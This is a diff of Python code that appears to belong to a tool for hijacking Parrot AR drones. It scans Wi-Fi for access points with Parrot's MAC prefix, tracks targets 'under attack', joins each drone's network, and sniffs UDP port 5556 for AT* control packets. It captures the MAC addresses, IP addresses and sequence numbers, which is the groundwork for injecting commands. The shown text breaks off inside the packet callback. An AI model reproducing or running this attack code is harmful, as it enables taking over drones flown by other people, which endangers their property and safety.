@@ -7,45 +7,74 @@ def readConfig(): #TODO implement it
 	return ("", "")
 
 def readKnobState(): #TODO implement it
-	return ""
+	return "Aggressive"
 
-def scanAndConnectToParrot(interface, whitelist): #TODO implement whitelist, TODO change to separate scan & connect
-	parrotNotFound = True
-	while parrotNotFound:
-		aps = Cell.all(interface)
-		print aps
-		for ap in aps:
-			if ap.address.startswith('90:03:B7') or ap.address.startswith('58:44:98:13:80'): #if it is a parrot OR my phone (for testing)
-				print "Parrot Wifi found"
-				print ap
-				parrotNotFound = False
-				scheme = Scheme.for_cell(interface, 'abcde', ap)
-				scheme.delete() #otherwise "This scheme already exists" error
-				scheme.save()
-				scheme.activate() #connect to the Parrot's wifi
-				print "Connected to Parrot Wifi"
-				break
-		sleep(1)
+#def scanAndConnectToParrot(interface, whitelist): #TODO change to separate scan & connect
+#	parrotNotFound = True
+#	while parrotNotFound:
+#		aps = Cell.all(interface)
+#		print aps
+#		for ap in aps:
+#			if ap.address.startswith('90:03:B7') or ap.address.startswith('58:44:98:13:80'): #if it is a parrot OR my phone (for testing)
+#				print "Parrot Wifi found"
+#				print ap
+#				parrotNotFound = False
+#				scheme = Scheme.for_cell(interface, 'abcde', ap)
+#				scheme.delete() #otherwise "This scheme already exists" error
+#				scheme.save()
+#				scheme.activate() #connect to the Parrot's wifi
+#				print "Connected to Parrot Wifi"
+#				break
+#		sleep(1)
 
 def scanForParrots(interface, whitelist, underattack):
-	return []
+	aps = Cell.all(interface)
+	parrots = []
+	for ap in aps:
+		if ap.address.startswith('90:03:B7') or ap.address.startswith('58:44:98:13:80'): #if it is a parrot OR my phone (for testing)
+			if ap.address not in whitelist and ap.address not in underattack: #only add if new and not on the whitelist
+				print "New parrot wifi found:", ap.ssid
+				parrots.append(ap)
+	return parrots
 
-def getWifiStrength(interface): #TODO implement it
-	return 0
+def connectTo(ap, interface):
+	try:
+		scheme = Scheme.for_cell(interface, ap.ssid, ap)
+		scheme.delete() #otherwise "This scheme already exists" error
+		scheme.save()
+		scheme.activate() #connect to the Parrot's wifi
+		return True
+	except Exception as detail:
+		print "Error while trying to connect to wifi in function connectTo - ", detail
+		return False
+
+def getWifiStrength(interface):
+	aps = Cell.all(interface) #aps first element is always the one we are connected to right now
+	return aps[0].signal #a negative number, closer to 0 - closer the AP
+
+def disconnectFromWifi(interface):
+	#apparently python's wifi module can not disconnect from a network
+	return True
+
+def getAPsMAC(aps):
+	macs = []
+	for ap in aps:
+		macs.append(ap.address)
+	return macs
 
 srcMAC= ""
 dstMAC= ""
 srcIP = ""
 dstIP = ""
 seqNr = ""
-def sniffParrotCommunication(interface): #TODO implement timeout
-	sniff(iface=interface, prn=pkt_callback, filter="udp and port 5556", count = 10)
-	return (srcMAC, dstMAC, srcIP, dstIP, seqNR)
+def sniffParrotCommunication(interface):
+	sniff(iface=interface, prn=pkt_callback, filter="udp and port 5556", count = 10, timeout = 1)
+	return (srcMAC, dstMAC, srcIP, dstIP, seqNr)
 
 def pkt_callback(pkt):
 	global srcMAC, dstMAC, srcIP, dstIP, seqNr
-	pkt.show() # debug statement
-	if 'AT*' in pkt[Raw].load and srcMAC == "":
+	#pkt.show() # debug
+	if Raw in pkt and 'AT*' in pkt[Raw].load and srcMAC == "":
 		srcMAC= pkt[Ether].src
 		dstMAC= pkt[Ether].dst
 		srcIP = pkt[IP].src
